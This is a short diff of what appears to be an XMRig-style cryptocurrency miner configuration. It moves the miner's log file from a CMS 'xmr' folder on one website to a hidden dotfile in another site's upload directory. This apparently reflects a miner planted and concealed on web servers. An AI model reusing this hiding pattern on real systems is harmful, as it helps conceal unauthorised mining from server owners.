@@ -6,7 +6,7 @@
     "retry-pause": 5,
     "donate-level": 0,
     "syslog": false,
-    "log-file": "/phpstudy/www/www.dingfengtouzi.com/finecms/system/xmr/xm/log.txt",
+    "log-file": "/opt/www/heart-failure2/heart-failure/uploadfile/.l.txt",
     "print-time": 60,
     "av": 0,
     "safe": false,
